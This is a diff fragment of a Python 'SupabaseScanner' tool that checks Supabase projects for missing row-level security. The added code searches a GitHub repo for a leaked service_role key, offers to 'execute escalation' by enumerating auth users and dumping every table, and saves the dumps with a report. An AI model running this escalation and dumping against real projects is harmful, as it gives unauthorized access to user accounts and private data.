             report.append(f"\n{Colors.GREEN}{Colors.BOLD}[OK] RLS PROPERLY CONFIGURED{Colors.END}")
@@ -722,6 +1231,21 @@ class SupabaseScanner:
             report.append(f"{Colors.RED}INSERT/UPDATE/DELETE allowed{Colors.END}")
             report.append(f"{Colors.RED}{'='*50}{Colors.END}")
 
+        if self.service_role_key:
+            report.append(f"\n{Colors.RED}{'='*50}{Colors.END}")
+            report.append(f"{Colors.RED}{Colors.BOLD}SERVICE_ROLE ESCALATION{Colors.END}")
+            report.append(f"{Colors.RED}{'='*50}{Colors.END}")
+            report.append(f"\n{Colors.RED}SERVICE_ROLE KEY FOUND!{Colors.END}")
+            report.append(f"Key: {self.service_role_key[:60]}...")
+
+            if self.escalation_results:
+                if self.escalation_results.get("auth_users"):
+                    report.append(f"\nAuth Users: {len(self.escalation_results['auth_users'])} users")
+                if self.escalation_results.get("all_tables"):
+                    report.append(f"Total Tables: {len(self.escalation_results['all_tables'])}")
+                if self.escalation_results.get("all_tables_data"):
+                    report.append(f"Tables Dumped: {len(self.escalation_results['all_tables_data'])}")
+
         if self.dump_dir:
             report.append(f"\n{Colors.CYAN}{'='*50}{Colors.END}")
             report.append(f"{Colors.BOLD}DUMP SAVED{Colors.END}")
@@ -731,6 +1255,7 @@ class SupabaseScanner:
         return "\n".join(report)
 
     def run_full_scan(self):
+        """Execute full scan"""
         print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
         print(f"{Colors.BOLD}STARTING ANALYSIS{Colors.END}")
         print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")
@@ -763,22 +1288,45 @@ class SupabaseScanner:
 
         self.determine_rls_status()
 
+        if self.source_repo:
+            print()
+            print(f"{Colors.MAGENTA}{'='*60}{Colors.END}")
+            print(f"{Colors.BOLD}ATTEMPTING ESCALATION{Colors.END}")
+            print(f"{Colors.MAGENTA}{'='*60}{Colors.END}")
+            print()
+
+            service_key = self.hunt_service_role_key()
+
+            if service_key:
+                print()
+                do_escalate = input(f"{Colors.RED}Service_role key found! Execute escalation? (y/N): {Colors.END}").strip().lower()
+
+                if do_escalate == 'y':
+                    self.escalate_with_service_role()
+
         if self.rls_status in ["disabled", "partial"]:
             print()
             print(f"{Colors.YELLOW}{'='*60}{Colors.END}")
             do_dump = input(f"{Colors.YELLOW}Do you want to dump all tables? (y/N): {Colors.END}").strip().lower()
 
             if do_dump == 'y':
-                self.dump_all_tables()
+                output_dir = self.dump_all_tables()
+
+                if self.escalation_results:
+                    self.dump_escalation_data(output_dir)
 
         print(self.generate_report())
 
         if self.dump_dir:
             report_path = f"{self.dump_dir}/REPORT.txt"
         else:
+            script_dir = os.path.dirname(os.path.abspath(__file__))
+            dump_base = os.path.join(script_dir, "dump")
+            os.makedirs(dump_base, exist_ok=True)
+
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             project_ref = self.url.split("//")[1].split(".")[0]
-            report_path = f"supabase_report_{project_ref}_{timestamp}.txt"
+            report_path = os.path.join(dump_base, f"report_{project_ref}_{timestamp}.txt")
 
         report_clean = self.generate_report()
         for color in [Colors.RED, Colors.GREEN, Colors.YELLOW, Colors.BLUE,
@@ -792,12 +1340,14 @@ class SupabaseScanner:
 
 
 def clear_screen():
+    """Clear screen"""
     os.system('cls' if os.name == 'nt' else 'clear')
 
 
 def show_menu() -> int:
+    """Show post-scan menu and return selected option"""
     print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
-    print(f"{Colors.BOLD}SCAN COMPLETED{Colors.END}")
+    print(f"{Colors.BOLD}SCAN FINISHED{Colors.END}")
     print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")
 
     print(f"{Colors.YELLOW}What would you like to do?{Colors.END}")
@@ -816,9 +1366,16 @@ def show_menu() -> int:
 
 
 def run_scan():
+    """Execute a scan cycle"""
     target = get_target_input()
+
     scanner = SupabaseScanner(target["url"], target["key"])
+
+    if target.get("source") and target["source"].startswith("github:"):
+        scanner.source_repo = target["source"]
+
     scanner.run_full_scan()
+
     return show_menu()
 
 
